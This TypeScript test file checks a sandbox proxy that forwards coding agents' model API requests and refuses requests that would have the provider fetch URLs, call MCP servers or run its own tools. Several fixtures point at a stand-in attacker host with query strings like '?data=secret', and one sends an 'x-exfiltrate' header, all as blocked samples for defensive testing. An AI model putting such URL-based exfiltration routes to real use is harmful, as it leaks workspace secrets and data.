import type { ModelProvider } from "@gateweave/agents-model";
import { afterEach, describe, expect, it, vi } from "vitest";
import { CLAUDE_CODE_PLACEHOLDER_KEY } from "../src/claude-code";
import { CODEX_PLACEHOLDER_KEY } from "../src/codex";
import type { RunningEngine, SandboxEngine } from "../src/engines";
import type { EngineMeter, MeteredRequest } from "../src/meter";
import { sendModelRequest } from "../src/model-requests";
import { OPENCODE_PLACEHOLDER_KEY } from "../src/opencode";
import { anthropicStream, fakeModel, KEY } from "./support";

afterEach(() => {
	vi.restoreAllMocks();
});

const MESSAGES = "https://api.anthropic.com/v1/messages?beta=true";
const COUNT = "https://api.anthropic.com/v1/messages/count_tokens?beta=true";
const RESPONSES = "https://api.openai.com/v1/responses";
const GENERATE =
	"https://generativelanguage.googleapis.com/v1beta/models/gemini-3-pro:streamGenerateContent?alt=sse";

/** The engine running a turn, as the sandbox holds it, on the agent's model. */
function engine(engineName: SandboxEngine, provider: ModelProvider, model: string): RunningEngine {
	return {
		engine: engineName,
		provider,
		model,
		access: {
			key: KEY,
			metadata: { workspace: "w", agent: "a", conversation: "c" },
			tools: null,
			meter: { conversation: "c", token: "turn-token" },
		},
	};
}

/** A meter that keeps what the conversation would record, and the Worker's `waitUntil`. */
function meterOf() {
	const ended: MeteredRequest[] = [];
	const waits: Promise<unknown>[] = [];
	let steps = 0;
	const meter: EngineMeter = {
		engineRequestStarted: async () => steps++,
		engineRequestEnded: async (_token, _step, request) => {
			ended.push(request);
		},
	};
	return {
		ended,
		context: { settings: {}, meter, waitUntil: (promise: Promise<unknown>) => waits.push(promise) },
		/** What was recorded, once the Worker would have waited for it. */
		recorded: async () => {
			await Promise.all(waits);
			return ended;
		},
	};
}

function post(url: string, body: unknown, headers: Record<string, string> = {}): Request {
	return new Request(url, {
		method: "POST",
		headers: { "content-type": "application/json", ...headers },
		body: typeof body === "string" ? body : JSON.stringify(body),
	});
}

/** The headers Claude Code sends to the Messages API, more or less, with its placeholder for a key. */
const CLAUDE_CODE_HEADERS = {
	"x-api-key": CLAUDE_CODE_PLACEHOLDER_KEY,
	"anthropic-version": "2023-06-01",
	"anthropic-beta":
		"claude-code-20250219,interleaved-thinking-2025-05-14,context-management-2025-06-27,prompt-caching-scope-2026-01-05,effort-2025-11-24",
	"anthropic-dangerous-direct-browser-access": "true",
	"user-agent": "claude-cli/2.1.308 (external, sdk-cli)",
	"x-app": "cli",
	"x-stainless-lang": "js",
	"x-claude-code-session-id": "11111111-2222-3333-4444-555555555555",
	accept: "application/json",
};

/** A request of Claude Code's main loop: its own tools, Gateweave's as MCP tools, no server tools. */
function claudeCodeRequest(fields: Record<string, unknown> = {}) {
	return {
		model: "claude-sonnet-5-5",
		max_tokens: 32000,
		stream: true,
		system: [
			{ type: "text", text: "You are Claude Code, Anthropic's official CLI for Claude." },
			{ type: "text", text: "Be brief.", cache_control: { type: "ephemeral" } },
		],
		messages: [
			{ role: "user", content: [{ type: "text", text: "List the files" }] },
			{
				role: "assistant",
				content: [{ type: "tool_use", id: "toolu_1", name: "Bash", input: { command: "ls" } }],
			},
			{
				role: "user",
				content: [{ type: "tool_result", tool_use_id: "toolu_1", content: "a.txt\nb.txt" }],
			},
		],
		tools: [
			{
				name: "Bash",
				description: "Executes a given bash command",
				input_schema: { type: "object", properties: { command: { type: "string" } } },
			},
			{
				name: "mcp__gateweave__open_pull_request",
				description: "Opens a pull request",
				input_schema: { type: "object", properties: {} },
				defer_loading: false,
			},
			{
				type: "custom",
				name: "Read",
				description: "Reads a file",
				input_schema: { type: "object", properties: {} },
			},
		],
		metadata: { user_id: "user_abc_account__session_1" },
		thinking: { type: "adaptive" },
		context_management: { edits: [{ type: "clear_thinking_20251015", keep: "all" }] },
		output_config: { effort: "high" },
		...fields,
	};
}

/** A request of Codex's, to the Responses API, with its function and custom tools. */
function codexRequest(fields: Record<string, unknown> = {}) {
	return {
		model: "gpt-5.5",
		instructions: "You are Codex.",
		input: [
			{
				type: "message",
				role: "developer",
				content: [{ type: "input_text", text: "Be brief." }],
			},
			{ type: "message", role: "user", content: [{ type: "input_text", text: "List the files" }] },
			{
				type: "function_call",
				call_id: "call_1",
				name: "shell_command",
				arguments: '{"command":"ls"}',
			},
			{ type: "function_call_output", call_id: "call_1", output: "a.txt\nb.txt" },
			{
				type: "message",
				role: "user",
				content: [{ type: "input_image", image_url: "data:image/png;base64,iVBORw0KGgo=" }],
			},
		],
		tools: [
			{
				type: "function",
				name: "shell_command",
				description: "Runs a shell command",
				strict: false,
				parameters: { type: "object", properties: { command: { type: "string" } } },
			},
			{
				type: "custom",
				name: "apply_patch",
				description: "Edits files",
				format: { type: "grammar", syntax: "lark", definition: "start: /.+/" },
			},
			{
				type: "namespace",
				name: "mcp__gateweave__",
				description: "Gateweave's tools",
				tools: [{ type: "function", name: "open_pull_request", parameters: { type: "object" } }],
			},
		],
		tool_choice: "auto",
		parallel_tool_calls: true,
		reasoning: { effort: "medium", summary: "auto" },
		store: false,
		stream: true,
		include: ["reasoning.encrypted_content"],
		prompt_cache_key: "thread-1",
		...fields,
	};
}

/** OpenAI's streamed answer that ends at once, with its usage. */
function responsesStream(): Response {
	const completed = {
		type: "response.completed",
		response: {
			object: "response",
			model: "gpt-5.5",
			status: "completed",
			output: [],
			usage: { input_tokens: 12, output_tokens: 3, input_tokens_details: { cached_tokens: 0 } },
		},
	};
	return new Response(`event: response.completed\ndata: ${JSON.stringify(completed)}\n\n`, {
		headers: { "content-type": "text/event-stream" },
	});
}

describe("a model request from the sandbox", () => {
	it("goes out as Claude Code sent it, with the key, its betas and no telemetry, and is metered", async () => {
		const requests = fakeModel(() => anthropicStream("Two files."));
		const { context, recorded } = meterOf();
		const body = claudeCodeRequest();
		const response = await sendModelRequest(
			post(MESSAGES, body, CLAUDE_CODE_HEADERS),
			"anthropic",
			engine("claude-code", "anthropic", "claude-sonnet-5-5"),
			context,
		);
		expect(response.status).toBe(200);
		await response.text();
		const [sent] = requests;
		expect(sent?.url).toBe(MESSAGES);
		expect(sent?.body).toEqual(body);
		expect(sent?.headers.get("x-api-key")).toBe(KEY);
		expect(sent?.headers.get("anthropic-version")).toBe("2023-06-01");
		expect(sent?.headers.get("anthropic-beta")).toBe(CLAUDE_CODE_HEADERS["anthropic-beta"]);
		expect(sent?.headers.get("user-agent")).toBe(CLAUDE_CODE_HEADERS["user-agent"]);
		expect(sent?.headers.get("content-type")).toBe("application/json");
		for (const dropped of [
			"anthropic-dangerous-direct-browser-access",
			"x-app",
			"x-stainless-lang",
			"x-claude-code-session-id",
		]) {
			expect(sent?.headers.has(dropped)).toBe(false);
		}
		expect(await recorded()).toMatchObject([{ error: null, model: "claude-sonnet-5-5" }]);
	});

	it("counts tokens unmetered, as before", async () => {
		const requests = fakeModel(() => Response.json({ input_tokens: 10 }));
		const { context, recorded } = meterOf();
		const response = await sendModelRequest(
			post(COUNT, { model: "claude-sonnet-5-5", messages: [], tools: [] }, CLAUDE_CODE_HEADERS),
			"anthropic",
			engine("claude-code", "anthropic", "claude-sonnet-5-5"),
			context,
		);
		expect(response.status).toBe(200);
		expect(requests).toHaveLength(1);
		expect(await recorded()).toEqual([]);
	});

	it("goes out as Codex sent it, and is metered", async () => {
		const requests = fakeModel(() => responsesStream());
		const { context, recorded } = meterOf();
		const body = codexRequest();
		const response = await sendModelRequest(
			post(RESPONSES, body, {
				authorization: `Bearer ${CODEX_PLACEHOLDER_KEY}`,
				accept: "text/event-stream",
				originator: "codex_exec",
				version: "0.165.0",
				session_id: "thread-1",
				"x-codex-turn-metadata": "{}",
				"openai-organization": "org-elsewhere",
				"user-agent": "codex_exec/0.165.0",
			}),
			"openai",
			engine("codex", "openai", "gpt-5.5"),
			context,
		);
		expect(response.status).toBe(200);
		await response.text();
		const [sent] = requests;
		expect(sent?.body).toEqual(body);
		expect(sent?.headers.get("authorization")).toBe(`Bearer ${KEY}`);
		expect(sent?.headers.get("accept")).toBe("text/event-stream");
		expect(sent?.headers.get("user-agent")).toBe("codex_exec/0.165.0");
		for (const dropped of [
			"originator",
			"version",
			"session_id",
			"x-codex-turn-metadata",
			"openai-organization",
		]) {
			expect(sent?.headers.has(dropped)).toBe(false);
		}
		expect(await recorded()).toMatchObject([{ error: null, tokens: { input: 12, output: 3 } }]);
	});

	it("goes out as OpenCode sends it to each provider", async () => {
		const requests = fakeModel((_call, request) =>
			request.url.startsWith("https://api.openai.com") ? responsesStream() : anthropicStream("Ok."),
		);
		const { context } = meterOf();
		// `@ai-sdk/anthropic`, with the betas OpenCode adds.
		const anthropic = {
			model: "claude-sonnet-5-5",
			max_tokens: 32000,
			system: [{ type: "text", text: "You are opencode." }],
			messages: [{ role: "user", content: [{ type: "text", text: "List the files" }] }],
			tools: [
				{
					name: "bash",
					description: "Runs a command",
					input_schema: { type: "object", properties: {} },
					cache_control: { type: "ephemeral" },
				},
			],
			tool_choice: { type: "auto" },
			stream: true,
		};
		const fromAnthropic = await sendModelRequest(
			post(MESSAGES.replace("?beta=true", ""), anthropic, {
				"x-api-key": OPENCODE_PLACEHOLDER_KEY,
				"anthropic-version": "2023-06-01",
				"anthropic-beta": "interleaved-thinking-2025-05-14,fine-grained-tool-streaming-2025-05-14",
				"user-agent": "opencode/1.19.5 ai-sdk/anthropic/4.0.89",
			}),
			"anthropic",
			engine("opencode", "anthropic", "claude-sonnet-5-5"),
			context,
		);
		expect(fromAnthropic.status).toBe(200);
		await fromAnthropic.text();
		// `@ai-sdk/openai`'s Responses API.
		const openai = {
			model: "gpt-5.5",
			input: [{ role: "user", content: [{ type: "input_text", text: "List the files" }] }],
			tools: [
				{
					type: "function",
					name: "bash",
					description: "Runs a command",
					parameters: { type: "object", properties: {} },
					strict: false,
				},
			],
			tool_choice: "auto",
			store: false,
			stream: true,
		};
		const fromOpenAI = await sendModelRequest(
			post(RESPONSES, openai, { authorization: `Bearer ${OPENCODE_PLACEHOLDER_KEY}` }),
			"openai",
			engine("opencode", "openai", "gpt-5.5"),
			context,
		);
		expect(fromOpenAI.status).toBe(200);
		await fromOpenAI.text();
		// `@ai-sdk/google`, whose model is in the path.
		const google = {
			contents: [{ role: "user", parts: [{ text: "List the files" }] }],
			systemInstruction: { parts: [{ text: "You are opencode." }] },
			tools: [{ functionDeclarations: [{ name: "bash", parameters: { type: "object" } }] }],
			generationConfig: { maxOutputTokens: 8192 },
		};
		const fromGoogle = await sendModelRequest(
			post(GENERATE, google, { "x-goog-api-key": OPENCODE_PLACEHOLDER_KEY }),
			"google",
			engine("opencode", "google", "gemini-3-pro"),
			context,
		);
		expect(fromGoogle.status).toBe(200);
		expect(requests.map((request) => request.body)).toEqual([anthropic, openai, google]);
		expect(requests[0]?.headers.get("anthropic-beta")).toBe(
			"interleaved-thinking-2025-05-14,fine-grained-tool-streaming-2025-05-14",
		);
		expect(requests[2]?.headers.get("x-goog-api-key")).toBe(KEY);
	});

	it("goes out without the headers and betas no engine needs", async () => {
		const requests = fakeModel(() => anthropicStream("Ok."));
		const { context } = meterOf();
		const response = await sendModelRequest(
			post(MESSAGES, claudeCodeRequest(), {
				...CLAUDE_CODE_HEADERS,
				"anthropic-beta": "claude-code-20250219,mcp-servers-2025-12-04, files-api-2025-04-14",
				"x-exfiltrate": "the repository",
				cookie: "a=b",
				"anthropic-organization-id": "org-elsewhere",
			}),
			"anthropic",
			engine("claude-code", "anthropic", "claude-sonnet-5-5"),
			context,
		);
		expect(response.status).toBe(200);
		const headers = requests[0]?.headers;
		expect(headers?.get("anthropic-beta")).toBe("claude-code-20250219");
		expect(headers?.has("x-exfiltrate")).toBe(false);
		expect(headers?.has("cookie")).toBe(false);
		expect(headers?.has("anthropic-organization-id")).toBe(false);
	});
});

describe("a model request the sandbox may not make", () => {
	/** Sends `request` for `running`, and checks that it was refused, unsent, with a span that says why. */
	async function refused(
		request: Request,
		provider: "anthropic" | "openai" | "google",
		running: RunningEngine,
		words: RegExp,
	) {
		const requests = fakeModel(() => anthropicStream("Should not be asked."));
		const { context, recorded } = meterOf();
		const response = await sendModelRequest(request, provider, running, context);
		expect(response.status).toBe(403);
		expect(await response.text()).toMatch(words);
		expect(requests).toEqual([]);
		const spans = await recorded();
		expect(spans).toHaveLength(1);
		expect(spans[0]).toMatchObject({ finishReason: "error", model: null });
		expect(spans[0]?.error).toMatch(words);
	}

	const claudeCode = engine("claude-code", "anthropic", "claude-sonnet-5-5");
	const codex = engine("codex", "openai", "gpt-5.5");

	it("names no MCP server for Anthropic to call", async () => {
		const body = claudeCodeRequest({
			mcp_servers: [{ type: "url", url: "https://attacker.example/mcp", name: "x" }],
		});
		await refused(
			post(MESSAGES, body, CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/MCP servers/,
		);
	});

	it("uses no container on Anthropic's side", async () => {
		const body = claudeCodeRequest({ container: { skills: [] } });
		await refused(post(MESSAGES, body, CLAUDE_CODE_HEADERS), "anthropic", claudeCode, /container/);
	});

	it("gives Anthropic no tool of its own to run, such as web fetch", async () => {
		for (const type of [
			"web_fetch_20250910",
			"web_search_20250305",
			"code_execution_20250825",
			"advisor_20260301",
		]) {
			const base = claudeCodeRequest();
			const body = { ...base, tools: [...base.tools, { type, name: "web_fetch" }] };
			await refused(
				post(MESSAGES, body, CLAUDE_CODE_HEADERS),
				"anthropic",
				claudeCode,
				new RegExp(type),
			);
			vi.restoreAllMocks();
		}
	});

	it("checks Anthropic's token counts as its messages", async () => {
		const body = {
			model: "claude-sonnet-5-5",
			messages: [],
			tools: [{ type: "web_fetch_20250910", name: "web_fetch" }],
		};
		await refused(post(COUNT, body, CLAUDE_CODE_HEADERS), "anthropic", claudeCode, /web_fetch/);
	});

	it("has Anthropic fetch no image by URL", async () => {
		const body = claudeCodeRequest({
			messages: [
				{
					role: "user",
					content: [
						{
							type: "image",
							source: { type: "url", url: "https://attacker.example/?data=secret" },
						},
					],
				},
			],
		});
		await refused(post(MESSAGES, body, CLAUDE_CODE_HEADERS), "anthropic", claudeCode, /by URL/);
	});

	it("calls no other model on the workspace's key", async () => {
		const anthropic = claudeCodeRequest({ model: "claude-opus-5-5" });
		await refused(
			post(MESSAGES, anthropic, CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/claude-opus-5-5/,
		);
		vi.restoreAllMocks();
		await refused(post(RESPONSES, codexRequest({ model: "o3-pro" })), "openai", codex, /o3-pro/);
		vi.restoreAllMocks();
		await refused(
			post(GENERATE.replace("gemini-3-pro", "gemini-3-ultra"), { contents: [] }),
			"google",
			engine("opencode", "google", "gemini-3-pro"),
			/gemini-3-ultra/,
		);
		vi.restoreAllMocks();
		const { model: _, ...unnamed } = claudeCodeRequest();
		await refused(
			post(MESSAGES, unnamed, CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/only the agent's model/,
		);
	});

	it("gives OpenAI no tool of its own to run, such as an MCP server", async () => {
		const tools = [
			{ type: "mcp", server_label: "x", server_url: "https://attacker.example/mcp" },
			{ type: "web_search" },
			{ type: "web_search_preview" },
			{ type: "file_search", vector_store_ids: ["vs_1"] },
			{ type: "code_interpreter", container: { type: "auto" } },
			{ type: "image_generation" },
			{ type: "computer_use_preview" },
			{ type: "local_shell" },
			{ type: "namespace", name: "x", tools: [{ type: "mcp", server_label: "x" }] },
		];
		for (const tool of tools) {
			const base = codexRequest();
			const body = { ...base, tools: [...base.tools, tool] };
			await refused(post(RESPONSES, body), "openai", codex, /only tools the engine runs/);
			vi.restoreAllMocks();
		}
	});

	it("has OpenAI fetch no image or file by URL", async () => {
		for (const part of [
			{ type: "input_image", image_url: "https://attacker.example/?data=secret" },
			{ type: "input_file", file_url: "https://attacker.example/report.pdf" },
		]) {
			const body = codexRequest({
				input: [{ type: "message", role: "user", content: [part] }],
			});
			await refused(post(RESPONSES, body), "openai", codex, /by URL/);
			vi.restoreAllMocks();
		}
	});

	it("names no stored prompt, whose tools OpenAI would add", async () => {
		const body = codexRequest({ prompt: { id: "pmpt_1" } });
		await refused(post(RESPONSES, body), "openai", codex, /stored prompt/);
	});

	it("gives its tools as a list", async () => {
		const body = claudeCodeRequest({ tools: { web: { type: "web_fetch_20250910" } } });
		await refused(post(MESSAGES, body, CLAUDE_CODE_HEADERS), "anthropic", claudeCode, /as a list/);
	});

	it("reads nothing the workspace's OpenAI organization stored", async () => {
		const stored = [
			{ previous_response_id: "resp_1" },
			{ conversation: "conv_1" },
			{
				input: [
					{ type: "message", role: "user", content: [{ type: "input_image", file_id: "file_1" }] },
				],
			},
			{
				input: [
					{ type: "message", role: "user", content: [{ type: "input_file", file_id: "file_1" }] },
				],
			},
			{ input: [{ type: "item_reference", id: "msg_1" }] },
			// An item reference may leave out its type.
			{ input: [{ id: "msg_1" }] },
		];
		for (const fields of stored) {
			await refused(post(RESPONSES, codexRequest(fields)), "openai", codex, /stored/);
			vi.restoreAllMocks();
		}
	});

	it("pays no more than the default for a request", async () => {
		await refused(
			post(RESPONSES, codexRequest({ service_tier: "priority" })),
			"openai",
			codex,
			/service tier/,
		);
		vi.restoreAllMocks();
		await refused(
			post(MESSAGES, claudeCodeRequest({ inference_geo: "us" }), CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/region/,
		);
		vi.restoreAllMocks();
		await refused(
			post(MESSAGES, claudeCodeRequest({ speed: "fast" }), CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/faster/,
		);
	});

	it("takes OpenAI's default service tier", async () => {
		const requests = fakeModel(() => responsesStream());
		const { context } = meterOf();
		for (const tier of ["auto", "default"]) {
			const response = await sendModelRequest(
				post(RESPONSES, codexRequest({ service_tier: tier })),
				"openai",
				codex,
				context,
			);
			expect(response.status).toBe(200);
			await response.text();
		}
		expect(requests).toHaveLength(2);
	});

	it("has Google read no file by its URI, wherever the body names it", async () => {
		const google = engine("opencode", "google", "gemini-3-pro");
		const file = {
			fileData: { mimeType: "text/html", fileUri: "https://attacker.example/?data=secret" },
		};
		const bodies = [
			{ contents: [{ role: "user", parts: [file] }] },
			{ contents: [], systemInstruction: { parts: [file] } },
			{
				contents: [],
				system_instruction: {
					parts: [{ file_data: { mime_type: "text/html", file_uri: "https://attacker.example/" } }],
				},
			},
		];
		for (const body of bodies) {
			await refused(post(GENERATE, body), "google", google, /fileData/);
			vi.restoreAllMocks();
		}
	});

	it("uses no cached content of Google's, which brings its own tools", async () => {
		const google = engine("opencode", "google", "gemini-3-pro");
		for (const field of ["cachedContent", "cached_content"]) {
			const body = { contents: [], [field]: "cachedContents/abc" };
			await refused(post(GENERATE, body), "google", google, /cached content/);
			vi.restoreAllMocks();
		}
	});

	it("is at most 16 MB", async () => {
		const requests = fakeModel(() => anthropicStream("Should not be asked."));
		const { context, recorded } = meterOf();
		const body = claudeCodeRequest({ system: "x".repeat(16_000_001) });
		const response = await sendModelRequest(
			post(MESSAGES, body, CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			context,
		);
		expect(response.status).toBe(413);
		expect(requests).toEqual([]);
		expect(await recorded()).toMatchObject([{ error: expect.stringMatching(/16 MB/) }]);
	});

	it("gives Google no tool of its own to run, such as URL context", async () => {
		const body = {
			contents: [{ role: "user", parts: [{ text: "Read https://attacker.example/?data=secret" }] }],
			tools: [{ urlContext: {} }],
		};
		await refused(
			post(GENERATE, body),
			"google",
			engine("opencode", "google", "gemini-3-pro"),
			/urlContext/,
		);
	});

	it("is JSON, and unencoded", async () => {
		await refused(
			post(MESSAGES, "model=claude-sonnet-5-5", CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/only JSON/,
		);
		vi.restoreAllMocks();
		await refused(
			post(MESSAGES, "[]", CLAUDE_CODE_HEADERS),
			"anthropic",
			claudeCode,
			/JSON object/,
		);
		vi.restoreAllMocks();
		await refused(
			post(MESSAGES, claudeCodeRequest(), { ...CLAUDE_CODE_HEADERS, "content-encoding": "gzip" }),
			"anthropic",
			claudeCode,
			/unencoded/,
		);
	});
});
